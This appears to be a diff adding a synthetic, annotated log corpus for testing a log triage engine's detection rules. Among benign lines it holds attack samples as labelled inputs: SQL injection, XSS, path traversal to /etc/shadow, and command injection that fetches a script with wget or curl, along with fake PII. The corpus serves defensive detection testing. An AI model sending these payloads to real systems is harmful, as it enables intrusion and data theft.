@@ -1,0 +1,179 @@
+# synthetic_small.log - hand-written corpus for the triage engine (task T0.2).
+# A line "#@ rules: A,B" annotates the NEXT line with the exact set of regex rules that must match it
+# (on the normalized text); "none" means no rule matches. Text after " -- " is a free-form note.
+# Annotation lines are stream lines too and match no rule, with one exception: an annotation that
+# names the weak PERF keyword rule matches that rule itself (its keyword is case-insensitive).
+#
+# ---- SSH / PAM / sudo (AUTH) ----
+#@ rules: SSH_FAIL_PW
+Oct 11 10:02:11 srv1 sshd[2210]: Failed password for root from 203.0.113.5 port 52114 ssh2
+#@ rules: SSH_FAIL_PW
+Oct 11 10:02:19 srv1 sshd[2211]: Failed password for invalid user oracle from 203.0.113.5 port 52130 ssh2
+#@ rules: SSH_INVALID_USER
+Oct 11 10:02:15 srv1 sshd[2212]: Invalid user admin from 203.0.113.9 port 40122
+#@ rules: PAM_AUTH_FAIL
+Oct 11 10:03:01 srv1 sshd[2215]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.5  user=root
+#@ rules: SUDO_BAD_PW
+Oct 11 10:04:20 srv1 sudo: alice : 3 incorrect password attempts ; TTY=pts/0 ; USER=root ; COMMAND=/bin/ls
+#@ rules: SSH_ACCEPTED
+Oct 11 10:05:42 srv1 sshd[2230]: Accepted password for alice from 198.51.100.7 port 50222 ssh2
+#@ rules: SSH_ACCEPTED
+Oct 11 10:06:02 srv1 sshd[2241]: Accepted publickey for deploy from 198.51.100.8 port 51022 ssh2
+#@ rules: PII_EMAIL,SSH_FAIL_PW -- username is an email address
+Oct 11 10:06:20 srv1 sshd[2250]: Failed password for jane@example.com from 203.0.113.9 port 40200 ssh2
+#@ rules: none
+Oct 11 10:06:30 srv1 sshd[2230]: Connection closed by 198.51.100.7 port 50222 [preauth]
+#@ rules: none
+Oct 11 10:06:31 srv1 sshd[2230]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+# ---- HTTP access log (Apache combined) ----
+#@ rules: none
+198.51.100.23 - - [11/Oct/2026:10:07:00 +0530] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+#@ rules: HTTP_401_403
+198.51.100.23 - - [11/Oct/2026:10:07:05 +0530] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+#@ rules: HTTP_401_403
+198.51.100.24 - - [11/Oct/2026:10:07:09 +0530] "POST /login HTTP/1.1" 401 287 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+#@ rules: HTTP_5XX
+198.51.100.25 - - [11/Oct/2026:10:07:20 +0530] "POST /api/checkout HTTP/1.1" 502 173 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+#@ rules: none
+198.51.100.26 - - [11/Oct/2026:10:07:30 +0530] "GET /old-page HTTP/1.1" 301 0 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+#@ rules: none -- 401 appears in the path, not as a status code
+198.51.100.26 - - [11/Oct/2026:10:07:31 +0530] "GET /api/v1/users/4010 HTTP/1.1" 200 50 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+# ---- SEC: injection, XSS, traversal, scanners ----
+#@ rules: SQLI
+203.0.113.50 - - [11/Oct/2026:10:08:00 +0530] "GET /products?id=1+UNION+ALL+SELECT+username,password+FROM+users HTTP/1.1" 200 3011 "-" "Mozilla/5.0"
+#@ rules: SQLI -- needs url decoding
+203.0.113.50 - - [11/Oct/2026:10:08:02 +0530] "GET /search?q=1%27+OR+%271%27%3D%271 HTTP/1.1" 200 88 "-" "Mozilla/5.0"
+#@ rules: SQLI
+203.0.113.50 - - [11/Oct/2026:10:08:04 +0530] "GET /item?id=5;select+sleep(5)--+ HTTP/1.1" 200 12 "-" "Mozilla/5.0"
+#@ rules: SQLI
+203.0.113.50 - - [11/Oct/2026:10:08:06 +0530] "GET /item?id=5+and+1=(select+count(*)+from+information_schema.tables) HTTP/1.1" 200 12 "-" "Mozilla/5.0"
+#@ rules: ERR_LEVEL,SQLI -- two categories, SEC wins as primary
+2026-10-11 10:20:05,311 ERROR [db-pool-3] query failed: select * from users where id=1 union select password from users
+#@ rules: PII_EMAIL,SQLI -- two categories, SEC wins as primary; needs url decoding
+203.0.113.51 - - [11/Oct/2026:10:08:10 +0530] "GET /lookup?email=a@b.com'+OR+'1'='1 HTTP/1.1" 200 12 "-" "Mozilla/5.0"
+#@ rules: XSS -- needs url decoding
+203.0.113.52 - - [11/Oct/2026:10:08:20 +0530] "GET /q?x=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 88 "-" "Mozilla/5.0"
+#@ rules: XSS
+203.0.113.52 - - [11/Oct/2026:10:08:22 +0530] "GET /img?src=x+onerror=alert(1) HTTP/1.1" 200 88 "-" "Mozilla/5.0"
+#@ rules: PATH_TRAVERSAL -- needs url decoding
+203.0.113.53 - - [11/Oct/2026:10:08:30 +0530] "GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 209 "-" "Mozilla/5.0"
+#@ rules: PATH_TRAVERSAL -- needs url decoding
+203.0.113.53 - - [11/Oct/2026:10:08:32 +0530] "GET /%2e%2e/%2e%2e/etc/shadow HTTP/1.1" 400 226 "-" "Mozilla/5.0"
+#@ rules: CMD_INJECTION
+203.0.113.54 - - [11/Oct/2026:10:08:40 +0530] "GET /ping?host=8.8.8.8;+wget+http://203.0.113.54/x.sh HTTP/1.1" 200 12 "-" "Mozilla/5.0"
+#@ rules: CMD_INJECTION -- needs url decoding
+203.0.113.54 - - [11/Oct/2026:10:08:42 +0530] "GET /run?c=%24%28curl+http%3A%2F%2F203.0.113.54%2Fx%29 HTTP/1.1" 200 12 "-" "Mozilla/5.0"
+#@ rules: SCANNER_UA
+203.0.113.55 - - [11/Oct/2026:10:08:50 +0530] "GET / HTTP/1.1" 200 512 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
+#@ rules: HTTP_5XX,SCANNER_UA
+203.0.113.55 - - [11/Oct/2026:10:08:52 +0530] "GET /phpmyadmin/ HTTP/1.1" 500 12 "-" "Nikto/2.1.6"
+# ---- ERR: log levels, exceptions, crashes ----
+#@ rules: ERR_LEVEL
+2026-10-11 10:10:01,123 ERROR [main] OrderService - failed to persist order
+#@ rules: ERR_LEVEL
+2026-10-11 10:10:02,004 FATAL [main] Application - cannot bind port 8080
+#@ rules: ERR_LEVEL,JAVA_EXCEPTION
+2026-10-11 10:10:03,512 ERROR [http-3] OrderController - request failed: java.lang.IllegalStateException: order already closed
+#@ rules: JAVA_EXCEPTION
+Caused by: java.lang.NullPointerException: Cannot invoke "String.length()" because "s" is null
+#@ rules: JAVA_STACK
+	at com.example.OrderService.save(OrderService.java:42)
+#@ rules: JAVA_STACK
+	at com.example.OrderController.handle(OrderController.java:17)
+#@ rules: CRASH_OOM
+Oct 11 10:30:00 srv1 kernel: Out of memory: Killed process 4123 (java) total-vm:8123456kB, anon-rss:4011234kB
+#@ rules: CRASH_OOM
+Oct 11 10:31:10 srv1 kernel: app[881]: segfault at 0 ip 00007f3a12345678 sp 00007ffd1234 error 4 in libc.so
+# ---- PERF ----
+#@ rules: SLOW_QUERY
+2026-10-11T10:40:00Z db01 mysqld: slow query detected Query_time: 12.503211 Lock_time: 0.000123
+#@ rules: TIMEOUT
+2026-10-11 10:41:00 nginx: upstream timed out (110: Connection timed out) while reading response header from upstream, client: 203.0.113.77
+#@ rules: TIMEOUT -- weak keyword match (base 0.35), configuration text rather than a failure
+2026-10-11 10:41:05 config loaded: request_timeout=30s retries=3
+#@ rules: HIGH_LATENCY
+2026-10-11 10:42:00,100 INFO  ReportService - GET /api/report took 4821 ms
+#@ rules: none -- under 4 digits
+2026-10-11 10:42:01,200 INFO  ReportService - GET /api/summary took 312 ms
+#@ rules: RESOURCE_PRESSURE
+2026-10-11 10:43:00,000 WARN  PoolMonitor - Connection pool exhausted (max=50, active=50)
+#@ rules: RESOURCE_PRESSURE
+Oct 11 10:43:30 srv2 monitor: Disk usage 91% on /var
+#@ rules: none
+Oct 11 10:43:35 srv2 monitor: Disk usage 85% on /var
+# ---- PII ----
+#@ rules: PII_EMAIL
+2026-10-11 10:50:00,100 INFO  SignupService - signup completed for jane.doe@example.com via web
+#@ rules: PII_CARD,PII_AADHAAR -- the Aadhaar rule also matches the first 12 digits; Verhoeff must reject it
+2026-10-11 10:51:00,100 INFO  PaymentService - payment captured card=4111 1111 1111 1111 amount=499.00
+#@ rules: PII_CARD
+2026-10-11 10:51:05,100 INFO  PaymentService - payment captured card=4012888888881881 amount=120.00
+#@ rules: PII_CARD,PII_AADHAAR -- fails Luhn, so no label after validation
+2026-10-11 10:51:10,100 INFO  PaymentService - payment declined card=4111 1111 1111 1112 amount=99.00
+#@ rules: PII_AADHAAR
+2026-10-11 10:52:00,100 INFO  KycService - uid 2341 2341 2346 verified
+#@ rules: PII_AADHAAR
+2026-10-11 10:52:05,100 INFO  KycService - aadhaar=234123412346 stored
+#@ rules: PII_AADHAAR -- fails Verhoeff, so no label after validation
+2026-10-11 10:52:10,100 INFO  KycService - uid 234123412347 rejected
+#@ rules: PII_AADHAAR -- a 12-digit order id that fails Verhoeff, so no label after validation
+2026-10-11 10:52:15,100 INFO  OrderService - order id 523456789012 shipped
+#@ rules: none -- 12-digit order id starting with 1 cannot be an Aadhaar number
+2026-10-11 10:52:20,100 INFO  OrderService - order id 100234567890 shipped
+#@ rules: PII_PAN
+2026-10-11 10:53:00,100 INFO  KycService - pan ABCPE1234F submitted for onboarding
+#@ rules: none -- 4th letter X is not a valid holder type
+2026-10-11 10:53:05,100 INFO  KycService - pan ABCXE1234F submitted for onboarding
+#@ rules: none -- lower case
+2026-10-11 10:53:10,100 INFO  KycService - pan abcpe1234f submitted for onboarding
+#@ rules: PII_PHONE_IN
+2026-10-11 10:54:00,100 INFO  DeliveryService - contact mobile 9876543210 for delivery
+#@ rules: PII_PHONE_IN
+2026-10-11 10:54:05,100 INFO  DeliveryService - contact tel +91-9876543210 for delivery
+#@ rules: none -- 10 digits but first digit is not 6-9
+2026-10-11 10:54:10,100 INFO  DeliveryService - ref 1234567890 closed
+#@ rules: PII_SECRET_QS
+203.0.113.60 - - [11/Oct/2026:10:55:00 +0530] "GET /login?user=bob&password=hunter2 HTTP/1.1" 200 41 "-" "Mozilla/5.0"
+#@ rules: PII_SECRET_QS
+203.0.113.60 - - [11/Oct/2026:10:55:05 +0530] "GET /v1/data?api_key=sk_live_abc123&format=json HTTP/1.1" 200 41 "-" "Mozilla/5.0"
+#@ rules: none -- empty value
+203.0.113.60 - - [11/Oct/2026:10:55:10 +0530] "GET /login?password=&user=bob HTTP/1.1" 200 41 "-" "Mozilla/5.0"
+# ---- near misses and benign lines ----
+#@ rules: none
+2026-10-11 11:00:00,001 INFO  CacheService - refresh completed with 0 errors
+#@ rules: none
+2026-10-11 11:00:01,002 INFO  CacheService - Errors found: 0
+#@ rules: none -- select2 is a UI widget, not SQL
+198.51.100.30 - - [11/Oct/2026:11:00:02 +0530] "GET /static/select2.min.js HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+#@ rules: none -- "; sh" is followed by a letter, not a separator
+2026-10-11 11:00:03,001 INFO  Deploy - cleanup done; shutdown scheduled for tonight
+#@ rules: none -- tool names without a shell metacharacter in front
+2026-10-11 11:00:04,001 INFO  Docs - use curl or wget to fetch the file
+#@ rules: none -- two dots inside a name, not a parent directory
+198.51.100.31 - - [11/Oct/2026:11:00:05 +0530] "GET /files/a..b/c.txt HTTP/1.1" 200 5 "-" "Mozilla/5.0"
+#@ rules: none
+198.51.100.31 - - [11/Oct/2026:11:00:06 +0530] "GET /docs/etc/hostname.html HTTP/1.1" 200 5 "-" "Mozilla/5.0"
+#@ rules: none -- no colon after javascript
+2026-10-11 11:00:07,001 INFO  Build - powered by javascript framework 3.2
+#@ rules: none -- no dot in the mail domain
+2026-10-11 11:00:08,001 INFO  Mail - delivered to user@localhost
+#@ rules: none -- letter directly before the level word
+2026-10-11 11:00:09,001 INFO  Config - flag NONCRITICAL set
+#@ rules: none -- letter directly after the level word
+2026-10-11 11:00:10,001 INFO  UI - SHOWING ERRORS TAB
+#@ rules: none -- lower case
+2026-10-11 11:00:11,001 INFO  Audit - criticality assessment finished
+#@ rules: none -- invalid percent escape is left as it is
+198.51.100.32 - - [11/Oct/2026:11:00:12 +0530] "GET /a%zzb?q=hello+world HTTP/1.1" 200 5 "-" "Mozilla/5.0"
+#@ rules: PII_CARD -- a 14-digit timestamp looks like a card number; Luhn must reject it
+2026-10-11 11:00:13,001 INFO  Heartbeat - ts=20261011100000 ok
+#@ rules: none -- stack frame without leading whitespace
+at com.example.Foo.bar(Foo.java:1)
+#@ rules: none
+2026-10-11 11:00:14,001 INFO  Db - connected to 10.0.0.12:5432 in 3 ms
+#@ rules: none
+2026-10-11 11:00:15,001 INFO  Mail - password reset message sent to the user
+#@ rules: none -- empty line
+
+#@ rules: none
+Oct 11 11:01:00 srv1 CRON[3300]: (root) CMD (run-parts /etc/cron.hourly)
